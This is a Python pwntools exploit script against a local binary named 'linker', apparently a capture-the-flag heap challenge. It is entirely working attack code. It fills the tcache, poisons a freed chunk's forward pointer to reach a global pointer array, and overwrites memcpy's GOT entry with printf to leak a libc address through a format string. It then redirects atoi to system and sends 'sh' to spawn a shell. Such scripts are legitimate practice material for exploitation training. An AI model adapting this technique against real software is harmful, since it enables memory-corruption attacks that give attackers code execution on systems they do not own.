from pwn import *

p = process("./linker", env={"LD_PRELOAD":"./libc.so.6"})
e = ELF('./linker')
libc = ELF("./libc.so.6")
def add(size):
    p.sendlineafter('> ','1')
    p.sendlineafter('size:',str(size))

def edit(idx,data):
    p.sendlineafter('> ','2')
    p.sendlineafter('dex:',str(idx))
    p.sendafter('tent:',data)

def empty(idx):
    p.sendlineafter('> ','3')
    p.sendlineafter('dex:',str(idx))

def re():
    p.sendlineafter('> ','4')


p.sendlineafter('size:\n','5')
p.sendafter('name:\n','%15$p') # specifier for the FSB

'''
Chunk 0 - 6, count = 7: size 0x70
tcache is full
'''
for i in range(7):
    add(0x60)
    empty(0)

add(0x60) # chunk 0
add(0x60) # chunk 1
add(0x71) # chunk 2
empty(0)  # chunk 0 -> free'd -> 0x70
edit(0,p64(0x6020C0)) # chunk[0]->fd = 0x6020c0 
add(0x60) # chunk 0
add(0x60) # chunk 3

payload = p64(0xff)*2
payload += p64(0x0)*4
payload += p64(e.got['memcpy'])
payload += p64(e.got['atoi'])
'''
ptr[0] = memcpy@got
ptr[1] = atoi@got
'''
edit(3,payload)
edit(0,p64(e.plt['printf'])) # ptr[0] -> memcpy@got -> printf@plt -> FSB
re() # relogin to trigger memcpy
p.sendafter('name:\n','\n') 
libc.address = int(p.recvuntil('W')[:-1],16) - libc.symbols['__libc_start_main'] - 231 # FSB -> %15$p -> __libc_start_main + 231
log.info(f"libc.address:  {hex(libc.address)}")


edit(1,p64(libc.symbols['system'])) # ptr[1] -> atoi@got -> system@libc
p.sendline('sh\x00')  # aoi("sh") -> system("sh")
p.interactive()